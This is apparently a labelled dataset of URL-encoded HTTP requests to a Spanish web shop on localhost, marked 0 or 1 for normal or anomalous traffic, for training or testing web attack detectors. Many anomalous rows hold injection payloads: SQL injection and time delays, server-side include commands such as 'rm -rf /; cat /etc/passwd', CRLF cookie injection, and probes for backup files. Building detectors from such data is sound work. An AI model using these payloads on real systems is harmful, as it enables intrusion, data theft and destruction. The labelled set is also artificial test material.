localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 945 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = carmelo & pwd = cicerone & remembera = off & b1 = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = redding & password = en2itativa & nombre = italina & apellidos = escarp + borrut & email = mattews @ ytv . com . ls & dni = 53217744e & direccion = sarchal + 153 ,  + 1 - e & ciudad = villasbuenas & cp = 25520 & provincia = álava & ntc = 9097917444528298 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = don & pwd = re , gaj , al & remember = off & b1 = entrar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombrea = vino + rioja & precio = 85 & cantidad = 71 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = any % 3f % 0aset - cookie % 3a + tamper % 3d5765205567234876235 & pwd = e4pe5imenta2a & remember = on & b1 = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precioa = 5500 & b1 = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / pagar . jspmodoa = insertar & precio = 8112 & b1 = pasar + por + caja,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = dongmoon & password = va7icinio & nombre =  + sid + onio & apellidos = corado + bonías & email = kempson @ ajuntamentbcn20 . pw & dni = 41944516z & direccion = gran + passeig + de + ronda ,  + 34 ,  +  & ciudad = laroya & cp = 12170 & provincia = ávila & ntc = 2439487997565772 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = ofelia & pwd = tun92 & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = vino + rioja & precio = 85 /  & cantidad = 56 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = vino + rioja & precio = 100 & cantidad = 6 & b1 =  ? ,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = krummell & pwd = es * tafilococo & remember = on & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar < ! -  -  # include + file =  "" archivo _ secreto ""  +  -  -  >  & precio = 4179 & b1 = confirmar",1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = kolahi45 & password = o5 $ 57t4 & nombre = segismundo & apellidos = torrà & email = unkel - richler @ nanogenerador . bu & dnia = 62093064x & direccion = calle + puerto + oncala ,  + 80 ,  + 7 ? g & ciudad = almazul & cp = 20495 & provincia = navarra & ntc = 9824241120494731 & b1 = registrar",1
localhost : 8080 / tienda1 / imagenes / 3 . gif / asf - logo - wide . gif /  . old,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = dillingh & pwd = revolcado & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = rodent & pwd = e2228a5in3r & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 3752 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precioa = 3662 & b1 = confirmar,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 4414 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = vino + rioja & precio = 39 /  & cantidad = 97 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 9536 & b1 = confirmar '  + and +  ' 1 '  =  ' 1,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = percy & password = favo6ecedora & nombre = parís & apellidosa = corral + rahal & email = healy @ ajedrezconmaestros . ch & dni = 15756299b & direccion = carrer + verge + de + l ' alba ,  + s / n +  & ciudad = san + morales & cp = 15338 & provincia = león & ntc = 8682803216185712 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = shapiro & password = un , tar & nombre = calixto & apellidos = bonas + crehuet & email = perepeczko @ zarasalud . rw & dni = 76410524q & direccion = diposit + 136 ,  + 1g & ciudad = guancha ,  + la & cp = 12214 & provincia = granada & ntc = 2829438543802993 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = widuch & password = 7am2r0í502 & nombre = aladino & apellidos = iriarte + porres & email = gahan _ boorman @ eneltajo . tt & dni = 93685529c & direccion = pl .  + del + mexuar ,  + 179 ,  + 1 - d & ciudad =  ?  & cp = 26288 & provincia = soria & ntc = 5513132638351756 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = poluchow & password = hematosis & nombre = rode & apellidos = doniz + barnera & email = shari @ bidrain . as & dni = 88300533z & direccion = maya ,  + 107 ,  + 5 - c & ciudad = riaño & cp = 18570 & provincia = ávila & ntc = 4896892002459011 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / vaciar . jsp / 4861362529278789730 . bak,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = jamón + ibérico & precio = 39 & cantidad = 73 & b1 =  % 3f,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = mobley & pwd = r10bo9b7 & remember = on /  & b1 = entrar,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = starkes & pwd = im387n9c91n & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = vino + rioja & precio = 39 & cantidad = 42 < ! -  -  # exec + cmd =  "" rm +  - rf +  /  ; cat +  / etc / passwd ""  +  -  -  >  & b1 = añadir + al + carrito",1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = queso + manchego & precio = 85 & cantidad = 3 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 /  & nombre = jamón + ibérico & precio = 85 & cantidad = 77 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = monaco & password = roznar & nombre = kiara & apellidos = palenzuela + usa & email = badland . paudler @ diseñodesoftware . do & dnia = 86214709z & direccion = c /  + alegria ,  + 141 ,  + 12 - h & ciudad = villanueva + de + oscos & cp = 24735 & provincia = ciudad + real & ntc = 4654942357042652 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6801 & b1 = confirmar / ,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = brough & pwd = pluviómetro & remember = off & b1a = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = schenck6 & password = velocípedo & nombre = rangle & apellidos = santalo + gabas & email = gelman _ fildes @ qcole . et +  & dni = 20787549b & direccion = lugar + montaña + del + palmital ,  + 143 ,  + 8 - e & ciudad = maracena & cp = 16855 & provincia = toledo & ntc = 1669337364255501 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = vino + rioja & precio = 100 & cantidad = 98 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 4144 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 1408 & b1 = confirmar / ,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = hodge & pwd = lac - rimógena & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = shirley -  & password = 732je5o & nombre = donardo & apellidos = baños + peleijà & email = bande @ white - pearl - resort . tm & dni = 07486760f & direccion = c /  + perdiz + 173 +  & ciudad = monterrubio & cp = 05191 & provincia = valencia & ntc = 4511974767515424 & b1 = registrar,0
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = tarra & password = bienh6dado & nombre = idalia & apellidos = pozo + carbot & email = bes @ s @ enyei @  @ webhut . md & dni = 43841813h & direccion = avinguda + marques + de + montroig + 110 + 11 - a & ciudad = novés & cp = 46370 & provincia = zamora & ntc = 3085190282266683 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = krummell & pwd = 5c2i _ onada & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 5384 & b1 = confirmar / ,1
"localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 3748 & b1 = pasar + por + caja < ! -  -  # include + file =  "" archivo _ secreto ""  +  -  -  > ",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = helma & password = 92h126na & nombre = francisco + de + borja & apellidos = sofra + galcerán & email = mizell @ x2 . com . vu & dni = 61328646c & direccion = parc + de + la + budellera ,  + 3 ,  + 4 - b & ciudad = outes & cp = 43421 & provincia = huesca & ntc = 0417370510264127 & b1 = registrar < ! -  -  # include + file =  "" archivo _ secreto ""  +  -  -  > ",1
localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = warner & password = prebesta8 & nombre = kaya & apellidos = dorca & email = hilliard @ casasdefamosos . cl & dni = 96303004a & direccion = c /  + trueno + 148 +  & ciudad = miranda + de + ebro & cp = 44120 & provincia = cuenca & ntc = 8418930773865835 & b1 = registrar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precioa = 7767 & b1 = confirmar,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = chandran & password = su1sana3 & nombre = denis & apellidos = llopis + salmeron & email = roda @ pasajesaereosbaratos . sh & dni = 09882221h & direccion = rua + ruibal + 43 ,  +  & ciudad = cachorrilla & cp = 39727 & provincia = a + coruña & ntc = 4529909734156818 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = avie & password = 6os3o3ráf31a & nombre = fructuosa & apellidos = busca + amoretti & email = mueller - westernhagen @ touringa . nf & dni = 35726679c & direccion = c /  + alava ,  + 76 ,  +  & ciudad = bakaiku & cp = 37798 & provincia = valladolid & ntc = 9586442904610318 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = gean & pwd = réspede & remember = on & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = darpa8 & password = pa7em7 & nombre = crispino & apellidos = leon & email = dymon @ cursosenlaplaya . lk & dni = 70312987d & direccion = calamar ,  + s / n + 10 ? h & ciudad = palomeroand + 1 = 1 & cp = 26312 & provincia = álava & ntc = 2847781311275477 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo =  '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & precio = 4762 & b1 = confirmar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 /  & nombre = jamón + ibérico & precio = 85 & cantidad = 8 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = charla & password = hi09otismo & nombre = zita & apellidos =  * castillon + ravella & email = robb - ghostley @ botilleria . com . sb & dni = 09531645p & direccion = calle + dresde + 25 + 6 ? d & ciudad = molezuelas + de + la + carballeda & cp = 08281 & provincia = baleares +  ( illes )  & ntc = 7133217385805670 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = jamón + ibérico & precio = 85 & cantidad = 10 & b1a = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modoa = entrar & login = barrio & pwd = ja3886l7 & remember = on & b1 = entrar,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = trivedi9 & pwd = poética & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = gonzaga & password = acontecimiento & nombre = redenta & apellidos = libano + parramon & email = vigran @ maletti . cy & dni = 24320656l & direccion = calle + tagarnina ,  + 120 ,  + 13c & ciudad = roca + del + vallès ,  + la & cp = 10748 & provincia = castellónany % 0d % 0aset - cookie % 3a + tamper % 3d5765205567234876235 & ntc = 6815796601581594 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = queso + manchego & precio = 100 & cantidad = 23 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / index . jsp / 4861362529278789730 . inc,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = denyse & password = contingent9 & nombre = ignolinda & apellidos = badia + mónico & email = dunkus @ mediacar . gg & dni = 24968892t & direccion = calle + rio + guadiana + 46 ,  + 2 ? c & ciudad = fontanars + dels + alforins & cp = 12214 & provincia = zar * ago * z ? a & ntc = 2204165275827329 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = taeho & pwd = enfastiar & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = k *  / ato & pwd = d5s81l05r & remember = on & b1 = entrar,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = barenie & password = saga * z & nombre = casildo & apellidos = augueses + antoñanzas & email = ione @ likeanangel . mh & dni = 52187187a & direccion = gomera ,  + s / n ,  + 2 ? d & ciudad = sacañet & cp = 19118 & provincia = valladolid & ntc = 5382014853813321 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 1543 & b1 = confirmar / ,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = charness4 & password = panícula & nombre = pandora & apellidos = soria + llorenç & email = rush @ pisossantcugat . al & dni = 73103940g & direccion = san + benito + y + barrios ,  + 180 ,  +  & ciudad = carboneras & cp = 13001 & provincia = cantabria & ntc = 2990423543833590 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo =  ?  & login = ochman & password = d5j8dero & nombre = erico & apellidos = buscart & email = flavin @ opel - e - flex . kr & dni = 20589158h & direccion = passatge + far ,  + 90 + 8 ? e & ciudad = santibáñez + del + val & cp = 46330 & provincia = lleida & ntc = 4447259758279371 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 2033 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = philippe & pwd = ceba $ do & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = sydeman6 & pwd = 0nc / on / 6it , ar & remember = on & b1 = entrar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = simen & pwd = ochentena & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 33 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = halsy & pwd = 4 ' sc ' o23u ' to & remember = off & b1 = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = marjan & password = ce16esi4a9 & nombre = reneé & apellidos = piñol + monguzzi & email = clapham . gravey @ juguetespersonales . ye & dni = 79234827b & direccion = merce ,  + 182 +  & ciudad = villagarcía + de + campos & cp = 34305 & provincia = alicante & ntc = 780906401924818 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodoa = entrar & login = win - chyi & pwd = 4mor0t3rse & remember = off & b1 = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 5912 & b1 = confirmar,0
localhost : 8080 / tienda1 / imagenes / 1 . gif /  . bak,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = jamón + ibérico & precio = 85 & cantidad = 41 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = margalo & pwd = distilatorio & remember = off /  & b1 = entrar,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = queso + manchego & precio = 85 & cantidad = 84 & b1 = añadir + al + carrito,0
"localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = vino + rioja & precio = 39 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & cantidad = 34 & b1 = añadir + al + carrito",1
"localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = mcnair & pwd = 81cob6r & remember = off < ! -  -  # exec + cmd =  "" rm +  - rf +  /  ; cat +  / etc / passwd ""  +  -  -  >  & b1 = entrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = jakabffy & password = 33arr179 & nombre = vahidreza & apellidos = curell + lagares & email = moura @ chicasdiabolo . iq & dni = 75130756z & direccion = urbanizacion + montesion ,  + 3 +  & ciudad = molinaseca & cp = 45180 & provincia =  < ! -  -  # exec + cmd =  "" ls +  /  ""  -  -  >  & ntc = 2571648203429012 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = yeirnie9 & pwd = 41tt8 & remember = on /  & b1 = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 150 & b1 = pasar + por + caja / ,1
localhost : 8080 / tienda1 / publico / anadir . jspida = 3 & nombre = jamón + ibérico & precio = 100 & cantidad = 48 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = surreau & password =  ' !fabl , ad / a & nombre = najla & apellidos = matamalas + reixachs & email = egger . nardo @ quecole . sr & dni = 56569418k & direccion = pl .  + tres + olivos ,  + s / n + 1 - f & ciudad = llíber & cp = 26321 & provincia = guadalajara & ntc = 5185081374868942 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login =  ""  >  < ! -  -  # exec + cmd =  "" dir +  ""  -  -  >  <  & pwd = 1ece57al & remember = off & b1 = entrar",1
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = kentaro & password = 4up493a562i5 & nombre = sulko & apellidos = mexía + sebastia & email = oliveros @ errebebe . ke & dni = 11983001r & direccion = molinos + 37 +  & ciudad = villanueva + del + rebollar + de + la + sierra & cp = any % 3f % 0aset - cookie % 3a + tamper % 3d5765205567234876235 & provincia = valladolid & ntc = 2471595611305823 & b1 = registrar,1
localhost : 8080 / tienda1 / imagenes / 3 . gif / asf - logo - wide,1
localhost : 8080 / 6909030637832563290 . jsp . bak,1
"localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = joannidi & pwd = arbo ,  / la ' do & remember = off & b1 = entrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 2181 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6714 & b1 = pasar + por + caja / ,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = noeschka & password = l53 $ 20a5i5 & nombre = epuyen & apellidos = monzó + turu & email = treacher - johnson @ pinturasultravioleta . mk & dni = 93658215f & direcciona = urbanizacion + montesion ,  + 3 +  & ciudad = aoiz / agoitz & cp = 39640 & provincia = salamanca & ntc = 1895469011099422 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 9764 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = coutelli95 & pwd = 6a3a & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = jamón + ibérico & precio = 100 & cantidad = 48 & b1 = añadir + al + carrito,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = anallese & password = tortosina & nombre = leonídas & apellidos = solá + portillo & email = perryman @ 15horas . sr & dnia = 92727720t & direccion = jose + maria + pereda ,  + 185 ,  +  & ciudad = ucero & cp = 09047 & provincia = valencia & ntc = 6368947017826630 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = lanteign3 & pwd = trisílabo & remember = off & b1 = entrar,0
localhost : 8080 / cfide / administrator / login . cfm,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = engelber & password = cameliea & nombre = harissa & apellidos = guarderas + bolivar & email = finklestein @ intg . ac & dni = 70754396w & direccion = c /  + estrella + polar ,  + 139 ,  + 11 ? a & ciudad = almendralejo & cp = 23649 & provincia = valencia & ntc = 6905475964358006 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = any % 0aset - cookie % 3a + tamper % 3d1041264011025374727 & precio = 634 & b1 = pasar + por + caja,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modoa = registro & login = keene - mo & password = des2l0bear & nombre = florio & apellidos = alcalde + rybensky & email = bobenko - steimaroua @ 926 . lb & dni = 65834957x & direccion = c /  + leganes ,  + 74 +  & ciudad = sant + miquel + de + campmajor & cp = 42138 & provincia = huesca & ntc = 7967092459392219 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = jamón + ibérico & precio = 39 & cantidad = 54 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = vino + rioja & precio = 39 & cantidad = 64 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 2286 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / publico / anadir . jspid =  < ! -  -  # include + file =  "" archivo _ secreto ""  +  -  -  >  & nombre = queso + manchego & precio = 85 & cantidad = 63 & b1 = añadir + al + carrito",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = any % 0d % 0aset - cookie % 3a + tamper % 3d5765205567234876235 & precio = 5059 & b1 = confirmar,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 2713 & b1 = confirmar,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = bondy & password = 5icoris8a & nombre = sandro & apellidos = bobet + coev & email = rajnay @ zytel . il & dni = 82858108x & direccion = pasadizo + cervantes + 85 ,  +  & ciudad = otero & cp = 37170 & provincia = zaragoza & ntc = 5885886039372193 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = schroer & pwd = rezumar & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = northrop & pwda = desbullar & remember = on & b1 = entrar,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = mozes & pwd = apasionadamente & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / global / titulo . jsp . inc,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = queso + manchego & precio = 85 /  & cantidad = 18 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = ques + o + manchego & precio = 39 & cantidad = 2 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modoa = insertar & precio = 2779 & b1 = confirmar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = jamón + ibérico & precio = 85 & cantidada = 15 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = sood & password = hoj - alatero & nombre = alessandra & apellidos = urioste + bohigas & email = rasmussen . ludlam8 @ easyviaggio . pw & dni = 91389293n & direccion = calle + andaluziako + komunitatea ,  + 156 + 9 ? g & ciudad = any % 3f % 0d % 0aset - cookie % 3a + tamper % 3d1041264011025374727 % 0d % 0a & cp = 05358 & provincia = baleares +  ( illes )  & ntc = 5011039662886040 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / vaciar . jsp / ,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = dinah & password = dañina & nombre = justina & apellidos = brasca + cabezas & email = vuosalmi . camp @ risiberia . ph & dni = 98531799y & direccion = nueva + puente + ladrillo ,  + 11 ,  + 3 - g & ciudad = puerto + de + santa + maría ,  + el & cp = 22586 & provincia = ávila & ntc = 0173606595958509 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = darwen & password = a2ec4n1r & nombre = yodalia & apellidos = canela + bernal & email = donohue @ cirugiaalbeiteria . lv & dni = 19725009w & direccion = c /  + guincho ,  + 191 ,  + 7 ? f & ciudad = carmona & cp = 46170 & provincia = toledo & ntc = 7217852490977732 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & logina = kube9 & pwd = 38r20nve1e9 & remember = on & b1 = entrar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = vino + rioja & precio = 39 & cantidad = 89 & b1 = añadir + al + carrito,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = calmenso & password = amanojada & nombre =  / wilfred ? o & apellidos = lazcano + lujan & email = waldon @ blueeyes . tr & dni = 69469940g & direccion = calle + coquina ,  + 5 ,  +  & ciudad = lecrín & cp = 47480 & provincia = girona & ntc = 4840542188767205 & b1 = registrar",1
localhost : 8080 / tienda1 / miembros / asf - logo - wide . gif . inc,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = northcot & password = ele5a6cia & nombre = nastassia & apellidos = fustanya + fontarnau & email = gluchkova2 @ webgune . nu & dni = 42604511r & direccion = rua + do + fento ,  + 95 ,  +  & ciudad = carrascal + del + río & cp = 49129 & provincia = salamanca & ntc = 5973883566551225 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = shapiro & password = 1a3t14izante & nombre = calixto & apellidos = bonas + crehuet & email = perepeczko @ zarasalud . rw & dni = 76410524q & direccion = diposit + 136 ,  + 1g % 00 & ciudad = guancha ,  + la & cp = 12214 & provincia = granada & ntc = 2829438543802993 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = hillyer & pwd = coadyuvadora & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = win - chyi & pwd = a1e143 , 3se & remember = off & b1 = entrar",1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = queso + manchego & precio = 100 & cantidad = 32 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 4139 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = tomaszew & password = 337p87oame18c04ism9 & nombre = romildo & apellidos = rutllan + llagostera & email = rhomberg @ yksoluap . to & dni = 35619410t & direccion = calle + plus + ultra ,  + 84 + 3 ? b & ciudad = fuenllana & cp = 19209 & provincia = guadalajara & ntc = 1730660874425447 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = queso + manchego & precio = 85 & cantidad = 61 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / anadir . jspida = 3 & nombre = jamón + ibérico & precio = 39 & cantidad = 41 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodoa = registro & login = rourke & password = d . iclino & nombre = yulisa & apellidos = atondo + kan & email = oak @ cpanelhost . com . be & dni = 29170567n & direccion = c /  + driza ,  + 63 + 11 - d & ciudad = fuensaldaña & cp = 02461 & provincia = ávila & ntc = 6074458836046165 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? ida = 2 & nombre = jamón + ibérico & precio = 100 & cantidad = 1 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = queso + manchego & precio = 39 & cantidad = 85 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 5164 & b1 = confirmar,0
